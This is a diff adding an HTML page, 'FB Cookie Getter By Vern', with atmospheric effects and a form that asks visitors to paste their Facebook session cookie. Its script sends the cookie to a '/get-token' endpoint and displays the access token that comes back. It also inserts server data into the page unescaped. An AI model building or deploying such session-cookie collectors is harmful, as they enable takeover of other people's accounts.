@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Cookie Getter By: Vern</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      height: 100%;
+      background: #000;
+      color: white;
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      position: relative;
+      animation: fadeIn 2s ease-in-out;
+    }
+
+    .fog {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://i.imgur.com/8aNUWWz.png') repeat;
+      opacity: 0.05;
+      z-index: 0;
+      animation: fogMove 200s linear infinite;
+    }
+
+    @keyframes fogMove {
+      from { background-position: 0 0; }
+      to { background-position: 10000px 0; }
+    }
+
+    .lightning {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: white;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 2;
+      animation: lightningFlash 6s infinite;
+    }
+
+    @keyframes lightningFlash {
+      0%, 96%, 100% { opacity: 0; }
+      97% { opacity: 0.1; }
+      98% { opacity: 0.5; }
+      99% { opacity: 0.2; }
+    }
+
+    .container {
+      position: relative;
+      z-index: 3;
+      background: rgba(10, 10, 10, 0.8);
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+      animation: slideUp 1.5s ease-out;
+    }
+
+    h2 {
+      color: #0ff;
+      margin-bottom: 25px;
+      font-size: 30px;
+      letter-spacing: 1px;
+      text-shadow: 0 0 10px #0ff;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 14px 16px;
+      margin: 12px 0;
+      font-size: 16px;
+      border-radius: 10px;
+      border: none;
+      outline: none;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    input:focus, select:focus {
+      transform: scale(1.02);
+      box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+    }
+
+    input, select {
+      background-color: #222;
+      color: white;
+    }
+
+    button {
+      background-color: #0ff;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.2s;
+    }
+
+    button:hover {
+      background-color: #08e;
+      transform: scale(1.03);
+    }
+
+    ul {
+      text-align: left;
+      margin-top: 20px;
+      padding-left: 20px;
+      color: #bbb;
+      font-size: 14px;
+    }
+
+    li {
+      margin-bottom: 8px;
+    }
+
+    iframe {
+      display: none;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Fog & Lightning -->
+<div class="fog"></div>
+<div class="lightning"></div>
+
+<!-- YouTube Music -->
+<iframe
+  width="0"
+  height="0"
+  src="https://www.youtube.com/embed/y6120QOlsfU?autoplay=1&loop=1&playlist=y6120QOlsfU"
+  frameborder="0"
+  allow="autoplay"
+></iframe>
+
+<!-- Thunder Sound -->
+<audio id="thunder" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_0a5d2b4c67.mp3?filename=thunder-strike-8074.mp3"></audio>
+
+<!-- Main UI -->
+<div class="container">
+  <h2>FB COOKIE GETTER BY VERN!</h2>
+
+  <input type="text" id="cookie" placeholder="Paste your FB cookie" required>
+  <button onclick="submitCookie()">Login</button>
+
+  <ul>
+    <li>This is just version 1</li>
+    <li>Version 2 will update soon</li>
+    <li>Stay updated</li>
+    <li>Don't breathe</li>
+  </ul>
+
+  <div id="result" style="margin-top: 15px; color: lime;"></div>
+</div>
+
+<script>
+  function submitCookie() {
+    const cookie = document.getElementById('cookie').value;
+    const resultDiv = document.getElementById('result');
+    resultDiv.innerHTML = '🔄 Processing...';
+
+    fetch('/get-token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({ cookie: cookie })
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.status === 'success') {
+        resultDiv.innerHTML = `🎉 Access Token:<br><code>${data.token}</code>`;
+      } else {
+        resultDiv.innerHTML = `❌ ${data.message}`;
+      }
+    })
+    .catch(err => {
+      resultDiv.innerHTML = '🔥 Error: ' + err.message;
+    });
+  }
+
+  // Thunder sound sync
+  const thunderAudio = document.getElementById('thunder');
+  setInterval(() => {
+    if (Math.random() > 0.85) {
+      thunderAudio.currentTime = 0;
+      thunderAudio.play();
+    }
+  }, 6000);
+</script>
+
+</body>
+</html>
